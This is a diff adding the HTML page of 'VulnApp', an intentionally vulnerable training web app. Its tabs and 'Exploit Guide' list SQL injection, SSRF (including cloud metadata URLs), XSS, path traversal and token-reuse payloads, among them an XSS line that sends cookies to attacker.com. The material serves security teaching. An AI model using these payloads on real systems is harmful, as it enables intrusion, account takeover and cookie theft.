@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VulnApp - Vulnerable Web Application</title>
+    <link rel="stylesheet" href="styles.css">
+    <!-- VULNERABILITY: No CSP, allowing inline scripts -->
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🔓 VulnApp</h1>
+            <p class="warning">⚠️ Intentionally Vulnerable Application - Educational Use Only</p>
+        </header>
+
+        <nav class="tabs">
+            <button class="tab active" onclick="showTab('login')">Login</button>
+            <button class="tab" onclick="showTab('import')">Import Repository</button>
+            <button class="tab" onclick="showTab('reset')">Password Reset</button>
+            <button class="tab" onclick="showTab('search')">Search Users</button>
+            <button class="tab" onclick="showTab('profile')">Profile</button>
+            <button class="tab" onclick="showTab('files')">File Browser</button>
+            <button class="tab" onclick="showTab('exploit')">Exploit Guide</button>
+        </nav>
+
+        <!-- Login Tab -->
+        <div id="login" class="tab-content active">
+            <h2>User Login</h2>
+            <div class="vulnerability-badge">
+                <span class="badge critical">SQL Injection</span>
+            </div>
+            
+            <form onsubmit="login(event)">
+                <div class="form-group">
+                    <label>Username:</label>
+                    <input type="text" id="login-username" placeholder="Try: admin' OR '1'='1" />
+                </div>
+                <div class="form-group">
+                    <label>Password:</label>
+                    <input type="password" id="login-password" placeholder="Try: ' OR '1'='1" />
+                </div>
+                <button type="submit" class="btn">Login</button>
+            </form>
+            
+            <div id="login-result" class="result"></div>
+            
+            <div class="hint">
+                <h3>💡 Exploitation Hint:</h3>
+                <p>Try SQL injection payloads:</p>
+                <code>admin' OR '1'='1'--</code><br>
+                <code>' OR 1=1--</code><br>
+                <code>' UNION SELECT * FROM users--</code>
+            </div>
+        </div>
+
+        <!-- Import Repository Tab -->
+        <div id="import" class="tab-content">
+            <h2>Import from GitHub</h2>
+            <div class="vulnerability-badge">
+                <span class="badge critical">SSRF</span>
+            </div>
+            
+            <form onsubmit="importRepo(event)">
+                <div class="form-group">
+                    <label>Repository URL:</label>
+                    <input type="text" id="repo-url" placeholder="https://api.github.com/repos/..." />
+                </div>
+                <div class="form-group">
+                    <label>User ID:</label>
+                    <input type="number" id="user-id" value="1" />
+                </div>
+                <button type="submit" class="btn">Import</button>
+            </form>
+            
+            <div id="import-result" class="result"></div>
+            
+            <div class="hint">
+                <h3>💡 Exploitation Hint:</h3>
+                <p>Try accessing internal services:</p>
+                <code>http://localhost:3000/api/debug/info</code><br>
+                <code>http://169.254.169.254/latest/meta-data/</code> (AWS metadata)<br>
+                <code>http://127.0.0.1:3000/api/users/search?q=admin</code><br>
+                <code>file:///etc/passwd</code> (may not work depending on axios config)
+            </div>
+        </div>
+
+        <!-- Password Reset Tab -->
+        <div id="reset" class="tab-content">
+            <h2>Password Reset</h2>
+            <div class="vulnerability-badge">
+                <span class="badge high">Non-Expiring Tokens</span>
+            </div>
+            
+            <div class="reset-section">
+                <h3>Step 1: Request Reset Token</h3>
+                <form onsubmit="requestReset(event)">
+                    <div class="form-group">
+                        <label>Email:</label>
+                        <input type="email" id="reset-email" placeholder="admin@vulnerable.local" />
+                    </div>
+                    <button type="submit" class="btn">Request Reset</button>
+                </form>
+                <div id="reset-request-result" class="result"></div>
+            </div>
+            
+            <div class="reset-section">
+                <h3>Step 2: Reset Password</h3>
+                <form onsubmit="resetPassword(event)">
+                    <div class="form-group">
+                        <label>Reset Token:</label>
+                        <input type="text" id="reset-token" placeholder="Paste token here" />
+                    </div>
+                    <div class="form-group">
+                        <label>New Password:</label>
+                        <input type="password" id="new-password" placeholder="New password" />
+                    </div>
+                    <button type="submit" class="btn">Reset Password</button>
+                </form>
+                <div id="reset-result" class="result"></div>
+            </div>
+            
+            <div class="hint">
+                <h3>💡 Exploitation Hint:</h3>
+                <p>Tokens never expire and can be reused multiple times!</p>
+                <p>Also vulnerable to SQL injection in email field.</p>
+            </div>
+        </div>
+
+        <!-- Search Users Tab -->
+        <div id="search" class="tab-content">
+            <h2>Search Users</h2>
+            <div class="vulnerability-badge">
+                <span class="badge high">SQL Injection</span>
+            </div>
+            
+            <form onsubmit="searchUsers(event)">
+                <div class="form-group">
+                    <label>Search Query:</label>
+                    <input type="text" id="search-query" placeholder="Try: admin' UNION SELECT 1,2,3,4,5,6--" />
+                </div>
+                <button type="submit" class="btn">Search</button>
+            </form>
+            
+            <div id="search-result" class="result"></div>
+            
+            <div class="hint">
+                <h3>💡 Exploitation Hint:</h3>
+                <p>SQL injection payloads:</p>
+                <code>%' OR '1'='1</code><br>
+                <code>' UNION SELECT id,username,password,email,role,bio FROM users--</code>
+            </div>
+        </div>
+
+        <!-- Profile Tab -->
+        <div id="profile" class="tab-content">
+            <h2>User Profile</h2>
+            <div class="vulnerability-badge">
+                <span class="badge high">Stored XSS</span>
+            </div>
+            
+            <div class="profile-section">
+                <h3>Update Bio</h3>
+                <form onsubmit="updateBio(event)">
+                    <div class="form-group">
+                        <label>User ID:</label>
+                        <input type="number" id="profile-user-id" value="1" />
+                    </div>
+                    <div class="form-group">
+                        <label>Bio (HTML allowed):</label>
+                        <textarea id="profile-bio" rows="4" placeholder="Try: <script>alert('XSS')</script>"></textarea>
+                    </div>
+                    <button type="submit" class="btn">Update Bio</button>
+                </form>
+            </div>
+            
+            <div class="profile-section">
+                <h3>View Profile</h3>
+                <form onsubmit="viewProfile(event)">
+                    <div class="form-group">
+                        <label>User ID:</label>
+                        <input type="number" id="view-user-id" value="1" />
+                    </div>
+                    <button type="submit" class="btn">View Profile</button>
+                </form>
+                <div id="profile-result" class="result"></div>
+            </div>
+            
+            <div class="hint">
+                <h3>💡 Exploitation Hint:</h3>
+                <p>Try XSS payloads in bio:</p>
+                <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code><br>
+                <code>&lt;img src=x onerror=alert('XSS')&gt;</code><br>
+                <code>&lt;svg onload=alert('XSS')&gt;</code>
+            </div>
+        </div>
+
+        <!-- File Browser Tab -->
+        <div id="files" class="tab-content">
+            <h2>File Browser</h2>
+            <div class="vulnerability-badge">
+                <span class="badge high">Path Traversal</span>
+            </div>
+            
+            <form onsubmit="browseFiles(event)">
+                <div class="form-group">
+                    <label>File Path:</label>
+                    <input type="text" id="file-path" placeholder="Try: ../../../etc/passwd or ." />
+                </div>
+                <button type="submit" class="btn">Browse</button>
+            </form>
+            
+            <div id="files-result" class="result"></div>
+            
+            <div class="hint">
+                <h3>💡 Exploitation Hint:</h3>
+                <p>Path traversal payloads:</p>
+                <code>.</code> (current directory)<br>
+                <code>..</code> (parent directory)<br>
+                <code>../server.js</code> (view source code)<br>
+                <code>../../..</code> (traverse up)
+            </div>
+        </div>
+
+        <!-- Exploit Guide Tab -->
+        <div id="exploit" class="tab-content">
+            <h2>Vulnerability Exploitation Guide</h2>
+            
+            <div class="exploit-card">
+                <h3>1. SQL Injection (Critical)</h3>
+                <p><strong>Location:</strong> Login, Search, Password Reset</p>
+                <p><strong>Impact:</strong> Authentication bypass, data exfiltration</p>
+                <p><strong>Payloads:</strong></p>
+                <ul>
+                    <li><code>admin' OR '1'='1'--</code></li>
+                    <li><code>' UNION SELECT * FROM users--</code></li>
+                    <li><code>' AND 1=2 UNION SELECT id,username,password,email,role,bio FROM users--</code></li>
+                </ul>
+            </div>
+            
+            <div class="exploit-card">
+                <h3>2. Server-Side Request Forgery (Critical)</h3>
+                <p><strong>Location:</strong> Import GitHub Repository</p>
+                <p><strong>Impact:</strong> Access internal services, cloud metadata, port scanning</p>
+                <p><strong>Payloads:</strong></p>
+                <ul>
+                    <li><code>http://127.0.0.1:3000/api/debug/info</code></li>
+                    <li><code>http://169.254.169.254/latest/meta-data/</code></li>
+                    <li><code>http://localhost:3000/api/users/search?q=</code></li>
+                </ul>
+            </div>
+            
+            <div class="exploit-card">
+                <h3>3. Stored XSS (High)</h3>
+                <p><strong>Location:</strong> User Bio field</p>
+                <p><strong>Impact:</strong> Session hijacking, cookie theft</p>
+                <p><strong>Payloads:</strong></p>
+                <ul>
+                    <li><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></li>
+                    <li><code>&lt;img src=x onerror="fetch('http://attacker.com?c='+document.cookie)"&gt;</code></li>
+                </ul>
+            </div>
+            
+            <div class="exploit-card">
+                <h3>4. Path Traversal (High)</h3>
+                <p><strong>Location:</strong> File Browser</p>
+                <p><strong>Impact:</strong> Source code disclosure, sensitive file access</p>
+                <p><strong>Payloads:</strong></p>
+                <ul>
+                    <li><code>../server.js</code></li>
+                    <li><code>../package.json</code></li>
+                    <li><code>../../..</code></li>
+                </ul>
+            </div>
+            
+            <div class="exploit-card">
+                <h3>5. Non-Expiring Tokens (High)</h3>
+                <p><strong>Location:</strong> Password Reset</p>
+                <p><strong>Impact:</strong> Account takeover</p>
+                <p><strong>Exploitation:</strong> Tokens never expire and can be reused indefinitely</p>
+            </div>
+            
+            <div class="exploit-card">
+                <h3>6. Information Disclosure (High)</h3>
+                <p><strong>Location:</strong> All error responses, /api/debug/info</p>
+                <p><strong>Impact:</strong> Stack traces, environment variables, system info</p>
+                <p><strong>Test:</strong> Visit <code>http://localhost:3000/api/debug/info</code></p>
+            </div>
+            
+            <div class="exploit-card">
+                <h3>7. Missing Security Headers (High)</h3>
+                <p><strong>Impact:</strong> XSS, clickjacking, MITM attacks</p>
+                <p><strong>Missing Headers:</strong></p>
+                <ul>
+                    <li>Content-Security-Policy</li>
+                    <li>X-Frame-Options</li>
+                    <li>Strict-Transport-Security</li>
+                    <li>X-Content-Type-Options</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <script src="app.js"></script>
+</body>
+</html>
